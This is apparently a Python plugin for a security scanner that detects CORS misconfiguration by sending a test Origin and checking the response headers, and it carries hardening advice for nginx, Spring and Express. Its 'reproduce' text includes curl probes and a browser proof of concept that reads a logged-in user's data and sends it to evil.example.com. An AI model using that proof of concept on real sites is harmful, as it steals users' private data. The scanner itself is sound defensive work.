# CORS 跨域配置检测 — Origin 反射 + Access-Control 头分析
from core.models import SEVERITY_MEDIUM, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from plugins.base import PluginBase


class CorsMisconfigPlugin(PluginBase):
    """检测目标是否存在 CORS 跨域配置不当（Origin 反射型）"""

    name = "CORS 跨域配置不当"
    cve = "N/A"
    severity = SEVERITY_MEDIUM
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A05:2021"
    category = "vuln"
    description = "目标服务器 CORS 配置不当，允许任意 Origin 跨域请求，可被利用发起 CSRF 攻击窃取数据"
    fix = "将 Access-Control-Allow-Origin 限制为可信域名白名单，禁止使用 * 或反射任意 Origin"
    fix_detail = (
        "【配置加固·nginx】使用 map 白名单校验 Origin，仅放行可信域名：\n"
        "  map $http_origin $allow_origin {\n"
        '      default "";\n'
        '      "~^https://(www\\.)?trusted\\.com$" "$http_origin";\n'
        '      "~^https://app\\.trusted\\.com$" "$http_origin";\n'
        "  }\n"
        "  add_header Access-Control-Allow-Origin $allow_origin always;\n"
        '  add_header Access-Control-Allow-Credentials "true" always;\n'
        '【代码修复·Spring】使用 @CrossOrigin(origins = {"https://www.trusted.com"}) 显式白名单，禁止 origins = "*"\n'
        '【代码修复·Express】app.use(cors({ origin: ["https://www.trusted.com"], credentials: true }))\n'
        "【配置原则】禁止反射任意 Origin；Access-Control-Allow-Credentials=true 时绝不可使用 ACAO: *；\n"
        "  通配符 * 与 Allow-Credentials=true 不可同时存在（浏览器规范强制）\n"
        "【WAF 规则】检测响应头 ACAO 为 * 或与请求 Origin 完全一致且 Allow-Credentials=true 时告警/拦截\n"
        "【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制"
    )
    reproduce = (
        "# 1. 构造恶意 Origin 探测是否被反射：\n"
        'curl -i -H "Origin: https://evil.example.com" "http://target/api/user"\n'
        "\n"
        "# 预期响应（漏洞存在，反射型）：\n"
        "#   HTTP/1.1 200\n"
        "#   Access-Control-Allow-Origin: https://evil.example.com\n"
        "#   Access-Control-Allow-Credentials: true   # 高危：可携带受害者 Cookie\n"
        "\n"
        "# 2. 探测通配符型 CORS（低危）：\n"
        'curl -i -H "Origin: https://evil.example.com" "http://target/api/public"\n'
        "#   Access-Control-Allow-Origin: *\n"
        "\n"
        "# 3. 预检请求（Preflight）探测可被调用的方法/头：\n"
        'curl -i -X OPTIONS -H "Origin: https://evil.example.com" \\\n'
        '  -H "Access-Control-Request-Method: PUT" \\\n'
        '  -H "Access-Control-Request-Headers: X-Custom" \\\n'
        '  "http://target/api/user"\n'
        "\n"
        "# 4. 浏览器侧利用 PoC（窃取已登录用户数据）：\n"
        "# 在 evil.example.com 部署如下 HTML，诱导受害者访问：\n"
        "#   <script>\n"
        '#   fetch("http://target/api/user", {credentials: "include"})\n'
        '#     .then(r => r.text()).then(d => fetch("https://evil.example.com/log?d=" + btoa(d)));\n'
        "#   </script>"
    )

    _TEST_ORIGIN = "https://evil.example.com"

    def verify(self, target, session) -> ScanResult:
        try:
            headers = {"Origin": self._TEST_ORIGIN}
            resp = session.get(target, headers=headers)
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")

            # 反射型 CORS：服务器将请求中的 Origin 原样返回
            if acao == self._TEST_ORIGIN:
                detail = "Origin 完全反射"
                if acac.lower() == "true":
                    detail += " + Allow-Credentials=true（高风险：可携带 Cookie）"
                return ScanResult(
                    kind=self.category,
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=target,
                    evidence=f"{detail}, ACAO={acao}, ACAC={acac}",
                    fix=self.fix,
                )
            # 通配符 CORS（信息级提示）
            elif acao == "*":
                return ScanResult(
                    kind=self.category,
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=target,
                    evidence="Access-Control-Allow-Origin=*（低风险：不可携带凭据但允许任意跨域读）",
                    fix=self.fix,
                )
            return ScanResult(
                kind=self.category,
                name=self.name,
                severity=self.severity,
                status=STATUS_SAFE,
                url=target,
                evidence=f"未反射 Origin, ACAO={acao or '(无)'}",
            )
        except Exception as e:
            return ScanResult(kind="error", name=self.name, status=STATUS_UNKNOWN, evidence=f"请求异常: {e}")
